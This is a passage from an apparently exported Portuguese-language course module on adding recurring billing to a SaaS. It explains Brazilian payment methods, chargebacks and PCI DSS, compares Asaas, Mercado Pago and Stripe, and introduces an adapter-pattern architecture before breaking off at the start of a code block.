acesso controlado por login e **pagamento automático**. Isso significa que o seu sistema vai lidar com dinheiro de verdade, sem ninguém conferindo cada transação. Um bug aqui não é só um incômodo: é cliente cobrado duas vezes, acesso liberado sem pagamento, ou um cliente pagante bloqueado. Neste módulo você aprende como pagamentos funcionam no Brasil, compara Asaas, Mercado Pago e Stripe, e constrói no Gestor a cobrança recorrente que libera e bloqueia o acesso sozinha.\n\nAo final deste módulo você será capaz de:\n1. Explicar como funcionam cartão, Pix e boleto, quem são os intermediários e o que é PCI.\n2. Escolher um provedor de pagamento com critérios objetivos.\n3. Desenhar a integração atrás de uma interface própria, para poder trocar de provedor.\n4. Modelar planos, assinaturas e faturas, com o ciclo de vida completo da assinatura.\n5. Processar eventos de pagamento com segurança e conciliar divergências.\n6. Automatizar a cobrança de inadimplentes e o bloqueio e liberação de acesso.\n7. Implementar a cobrança com Asaas, Mercado Pago e Stripe, testando em ambiente de testes.\n\n### Como estudar este módulo\n```mermaid\nflowchart LR\n    A[\"Aulas 10.1 a 10.3<br/>fundamentos, escolha, arquitetura\"] --> B[\"Aulas 10.4 a 10.6<br/>ciclo de vida, eventos, inadimplência\"]\n    B --> C[\"Aula 10.7<br/>os três provedores\"]\n    C --> T[\"Testes em sandbox\"]\n    T --> EN[\"Entregável: Gestor<br/>cobrando sozinho\"]\n    EN --> AV[\"Autoavaliação\"]\n```\n*Figura: do funcionamento dos pagamentos ao Gestor cobrando e liberando acesso sozinho.*\n\n| Semana | O que fazer | Horas |\n|---|---|---|\n| 19 | Aulas 10.1 a 10.4, exercícios 1 a 3 | 12 |\n| 20 | Aulas 10.5 a 10.7, exercícios 4 e 5, tarefa, entregável, autoavaliação | 14 |\n\n> ⚖️ **Aviso:** taxas, prazos de recebimento, métodos disponíveis e regras dos provedores mudam com frequência. Esta formação ensina o funcionamento e os critérios; **antes de qualquer decisão ou proposta, consulte as páginas oficiais** de cada provedor. Questões fiscais (emissão de nota sobre a assinatura, impostos) devem ser validadas com um contador.", "words": 331}, {"id": "m10-2", "title": "Aula 10.1: Como pagamentos funcionam no Brasil", "md": "Antes de integrar qualquer coisa, entenda o caminho do dinheiro. Isso explica as taxas, os prazos, os riscos de fraude e por que certas coisas (como guardar o número do cartão) você **nunca** faz.\n\n### Os personagens\n\n```mermaid\nflowchart LR\n    C[\"Cliente<br/>(quem paga)\"] --> GW[\"Provedor de pagamento<br/>Asaas, Mercado Pago, Stripe\"]\n    GW --> ADQ[\"Adquirente / processadora\"]\n    ADQ --> BAN[\"Bandeira<br/>Visa, Mastercard, Elo\"]\n    BAN --> EMI[\"Banco emissor<br/>do cartão do cliente\"]\n    GW -->|\"repassa, menos taxas\"| VOCE[\"Sua conta<br/>(ou a do seu cliente)\"]\n```\n*Figura: o caminho de um pagamento com cartão. O provedor de pagamento esconde essa cadeia de você e entrega uma API simples.*\n\nPara você, o personagem que importa é o **provedor de pagamento** (também chamado de gateway, subadquirente ou plataforma de pagamentos): ele recebe o pagamento, cuida da cadeia toda e repassa o dinheiro, cobrando uma taxa. Você integra com a API dele.\n\n### Os três meios principais\n\n| | Cartão de crédito | Pix | Boleto |\n|---|---|---|---|\n| Como paga | Digita os dados do cartão | QR Code ou \"copia e cola\" no app do banco | Código de barras, no banco ou app |\n| Confirmação | Na hora (aprovado/recusado) | Em segundos | Em até 1 a 3 dias úteis após o pagamento |\n| Recorrência automática | **Sim**: o cartão é cobrado todo mês sem ação do cliente | O cliente paga uma cobrança por vez (há modalidades de Pix automático/recorrente; verifique o suporte do provedor) | O cliente paga um boleto por mês |\n| Risco de fraude | Maior (cartão roubado, contestação) | Baixo | Baixo |\n| Contestação (chargeback) | **Sim**: o cliente pode contestar com o banco | Muito restrita | Não |\n| Quando o dinheiro chega | Conforme o plano do provedor (pode ser na hora, com antecipação, ou em dias) | Normalmente rápido | Após a compensação |\n\n> 🎯 **Implicação para SaaS:** cartão é o melhor meio para assinatura (cobra sozinho todo mês, menos inadimplência por esquecimento). Pix e boleto são importantes no Brasil e muitos clientes preferem, mas exigem que o cliente pague a cada mês, então seu sistema precisa **lembrar e cobrar** (Aula 10.6).\n\n### Chargeback: o risco do cartão\n\nUm **chargeback** (contestação) acontece quando o titular do cartão diz ao banco que não reconhece a compra. O valor é retirado de você, mesmo que o serviço tenha sido prestado, a menos que você comprove. Para SaaS:\n- Mantenha registros: data do aceite dos termos, logins do cliente, uso do sistema.\n- Nome claro na fatura do cartão (configurável no provedor), para o cliente reconhecer.\n- Cancelamento fácil: muitos chargebacks são de clientes que não acharam como cancelar.\n\n### PCI DSS: por que você nunca toca no número do cartão\n\nO **PCI DSS** é o padrão de segurança da indústria de cartões. Quem armazena, processa ou transmite dados de cartão precisa cumprir uma lista longa e cara de exigências, com auditorias.\n\nA boa notícia: **você não precisa, e não deve**. Os provedores oferecem formas em que o número do cartão vai **direto do navegador do cliente para o provedor**, sem passar pelo seu servidor:\n- **Página de pagamento do provedor** (checkout hospedado): o cliente é levado à página do provedor e volta.\n- **Campos seguros embutidos** (o formulário de cartão aparece na sua página, mas é do provedor).\n- **Tokenização**: o provedor devolve um identificador (token) que representa o cartão, e só ele serve para cobrar.\n\n> ⚠️ **Regra inegociável:** o número completo do cartão e o código de segurança (CVV) **nunca** passam pelo seu servidor, nunca vão para o banco, nunca vão para logs. Se o Claude propuser um formulário de cartão que envia os dados para a sua API, recuse. Você guarda só o que o provedor devolve: id do cliente no provedor, id da assinatura, últimos 4 dígitos e bandeira (para exibir).\n\n### Quem recebe o dinheiro: você ou o seu cliente?\n\nDuas situações diferentes, que mudam a integração:\n\n| Situação | Exemplo | Conta no provedor |\n|---|---|---|\n| **Você vende o seu SaaS** | Empresas pagam a assinatura do Gestor | **Sua** conta no provedor |\n| **Seu sistema cobra os clientes do seu cliente** | A ótica emite cobranças para os pacientes dela pelo sistema que você fez | Conta **do seu cliente** (ele integra com a chave dele), ou uma solução de \"subcontas\" / marketplace do provedor |\n\nNo segundo caso, a chave de API é do seu cliente: ela fica guardada **criptografada** (Módulo 14) e cada empresa usa a sua. Nunca use a sua conta para receber dinheiro que é do seu cliente sem uma estrutura própria (de marketplace, com contrato), porque isso traz responsabilidades fiscais e legais.\n\n> 📌 **Em resumo**\n> - O provedor de pagamento esconde a cadeia (adquirente, bandeira, banco) e entrega uma API.\n> - Cartão cobra sozinho e tem risco de contestação; Pix e boleto exigem que o cliente pague a cada ciclo.\n> - O número do cartão nunca passa pelo seu servidor: use checkout hospedado, campos seguros ou tokenização.\n> - Defina se o dinheiro é seu (sua conta) ou do seu cliente (a conta dele).\n\n### Para ir além\n- [Pix no Stripe (em inglês)](https://docs.stripe.com/payments/pix)", "words": 807}, {"id": "m10-3", "title": "Aula 10.2: Escolhendo o provedor: Asaas, Mercado Pago e Stripe", "md": "A escolha do provedor é uma decisão de arquitetura (vira ADR) e de negócio (afeta sua margem). Não existe \"o melhor\": existe o mais adequado para o seu caso. Esta aula compara os três que você pediu, com critérios que você vai reaplicar a qualquer provedor.\n\n### Os critérios\n\n| Critério | Pergunta |\n|---|---|\n| **Meios de pagamento** | Tem cartão, Pix e boleto? Quais funcionam com **recorrência**? |\n| **Assinaturas** | Tem recurso nativo de assinatura (cobra sozinho a cada ciclo)? Lida com troca de plano e cobrança proporcional? |\n| **Webhooks** | São confiáveis? Como verificam a origem? Reenviam em caso de falha? |\n| **Documentação e ambiente de testes** | É clara? Tem sandbox completo e cartões de teste? |\n| **Taxas e prazo de recebimento** | Quanto custa por transação e quando o dinheiro cai? (consultar a página oficial) |\n| **Público** | Seus clientes conhecem e confiam na marca? |\n| **Internacional** | Vai cobrar clientes fora do Brasil? |\n| **Recursos extras** | Emissão de nota fiscal, régua de cobrança, portal do cliente, split de pagamento |\n| **Suporte** | Em português? Rápido quando dá problema? |\n\n### Os três, lado a lado\n\n| | Asaas | Mercado Pago | Stripe |\n|---|---|---|---|\n| Origem e foco | Brasileiro, foco em cobrança para empresas | Do Mercado Livre, muito presente no varejo e no e-commerce brasileiro | Americano, presente em dezenas de países, inclusive no Brasil |\n| Ponto forte | Cobrança recorrente com Pix, boleto e cartão; régua de cobrança; painel e suporte em português | Marca conhecida pelo consumidor; checkout familiar; muitos meios | Documentação e ferramentas de desenvolvedor de referência; assinaturas muito completas (troca de plano, proporcional, portal do cliente) |\n| Assinaturas | Sim, com Pix, boleto e cartão (confira as regras atuais) | Sim (assinaturas/planos; confira os meios aceitos na recorrência) | Sim, muito completas (Billing); confira quais meios brasileiros funcionam em assinatura |\n| Verificação de webhook | Token configurado no painel, enviado em cabeçalho | Assinatura no cabeçalho, verificada com segredo | Assinatura no cabeçalho, verificada com o segredo do endpoint |\n| Ambiente de testes | Sandbox | Credenciais de teste | Modo de teste completo, com ferramenta de linha de comando para simular eventos |\n| Bom para | SaaS e serviços B2B no Brasil que precisam de Pix e boleto | Negócios em que o pagador final é consumidor e confia na marca | SaaS que quer as melhores ferramentas de assinatura, ou que cobra também fora do Brasil |\n\n> ⚠️ Esta tabela descreve características gerais na data da formação. **Confirme na documentação oficial**, especialmente os meios de pagamento aceitos em assinaturas recorrentes, que mudam com frequência.\n\n### A matriz de decisão\n\n```mermaid\nflowchart TB\n    Q1{\"Vai cobrar clientes<br/>fora do Brasil?\"}\n    Q1 -->|\"Sim\"| ST[\"Stripe como principal\"]\n    Q1 -->|\"Não\"| Q2{\"Seus clientes pagam<br/>muito com boleto e Pix?\"}\n    Q2 -->|\"Sim\"| Q3{\"Precisa de régua de cobrança<br/>e foco B2B?\"}\n    Q3 -->|\"Sim\"| AS[\"Asaas como principal\"]\n    Q3 -->|\"Não, pagador é consumidor<br/>que confia na marca\"| MP[\"Mercado Pago como principal\"]\n    Q2 -->|\"Não, quase tudo no cartão\"| ST2[\"Stripe ou qualquer um dos três:<br/>decida por taxa e ferramentas\"]\n```\n*Figura: uma matriz de decisão para o provedor principal. Ela é um ponto de partida; taxas atuais e preferência do público podem mudar a escolha.*\n\n### Por que não escolher \"para sempre\"\n\nTaxas sobem, provedores mudam regras, um concorrente aparece mais barato, um cliente grande exige outro meio. Por isso a arquitetura da Aula 10.3 coloca o provedor **atrás de uma interface**: trocar ou adicionar um provedor vira um trabalho de dias, não uma reescrita.\n\n### Exemplo completo: a decisão do Gestor\n\n- **Público:** pequenas e médias empresas brasileiras. Na descoberta, metade disse preferir boleto ou Pix (\"o financeiro paga tudo junto no dia 10\").\n- **Internacional:** não, por enquanto.\n- **Necessidades:** assinatura mensal e anual, teste grátis de 14 dias, troca de plano, régua de cobrança para Pix e boleto.\n\nDecisão (ADR 0004): **Asaas como principal** para o mercado brasileiro, com a interface de provedor pronta. **Stripe como segundo provedor planejado** para quando houver clientes no exterior ou para quem prefere cartão com portal de autoatendimento. Neste módulo você implementa os três no ambiente de testes, para dominar as diferenças.\n\n> 📌 **Em resumo**\n> - Escolha por meios aceitos na recorrência, assinaturas, webhooks, ambiente de testes, taxas, público e suporte.\n> - Asaas: forte em cobrança B2B brasileira com Pix e boleto; Mercado Pago: marca conhecida pelo consumidor; Stripe: ferramentas de assinatura de referência e alcance internacional.\n> - Confirme sempre na documentação oficial, especialmente o que funciona em recorrência.\n> - Nenhuma escolha é para sempre; a arquitetura deve permitir trocar.\n\n### Para ir além\n- [Documentação do Asaas (em português)](https://docs.asaas.com/)\n- [Documentação do Mercado Pago (em português)](https://www.mercadopago.com.br/developers/pt/docs)\n- [Assinaturas no Stripe (em inglês)](https://docs.stripe.com/billing/subscriptions/overview)", "words": 749}, {"id": "m10-4", "title": "Aula 10.3: A arquitetura: o provedor atrás de uma interface", "md": "Se o código do Gestor chamar o Asaas diretamente em 30 lugares, trocar de provedor (ou adicionar o Stripe) significa mexer em 30 lugares, com risco de quebrar a cobrança. A solução é um padrão clássico de engenharia: **uma interface própria**, com um **adaptador** para cada provedor.\n\n### O padrão adaptador\n\n```mermaid\nflowchart LR\n    SVC[\"Serviço de assinaturas<br/>do Gestor\"] --> IF[\"Interface ProvedorPagamento<br/>criarCliente, criarAssinatura,<br/>cancelar, consultarCobranca,<br/>validarWebhook, traduzirEvento\"]\n    IF --> A1[\"Adaptador Asaas\"]\n    IF --> A2[\"Adaptador Mercado Pago\"]\n    IF --> A3[\"Adaptador Stripe\"]\n    A1 --> P1[\"API Asaas\"]\n    A2 --> P2[\"API Mercado Pago\"]\n    A3 --> P3[\"API Stripe\"]\n```\n*Figura: o padrão adaptador. O Gestor só conhece a interface; cada adaptador traduz para um provedor. Trocar de provedor é trocar o adaptador.*\n\n```typescript\n// src/server
